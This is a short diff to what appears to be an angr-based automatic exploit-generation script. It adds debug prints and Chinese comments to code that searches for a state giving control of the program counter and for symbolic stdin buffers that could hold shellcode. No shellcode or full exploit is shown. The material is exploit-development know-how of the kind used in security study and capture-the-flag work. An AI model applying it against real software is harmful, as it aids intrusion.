@@ -46,11 +46,12 @@ def find_symbolic_buffer(state, length):
 
     # get all the symbolic bytes from stdin
     stdin = state.posix.stdin
-
     sym_addrs = []
     for _, symbol in state.solver.get_variables('file', stdin.ident):
+        print(_, " : ", symbol)
         sym_addrs.extend(state.memory.addrs_for_name(next(iter(symbol.variables))))
 
+    print(len(sym_addrs), sym_addrs)
     for addr in sym_addrs:
         if check_continuity(addr, sym_addrs, length):
             yield addr
@@ -68,6 +69,7 @@ def main(binary):
     # find a bug giving us control of PC
     l.info("looking for vulnerability in '%s'", binary_name)
     exploitable_state = None
+    # 先找到可利用状态
     while exploitable_state is None:
         sm.step()
         if len(sm.unconstrained) > 0:
@@ -88,6 +90,7 @@ def main(binary):
     l.info("attempting to create exploit based off state")
 
     # keep checking if buffers can hold our shellcode
+    # 进行利用，将shellcode插入buffer地址中
     for buf_addr in find_symbolic_buffer(ep, len(shellcode)):
         l.info("found symbolic buffer at %#x", buf_addr)
         memory = ep.memory.load(buf_addr, len(shellcode))
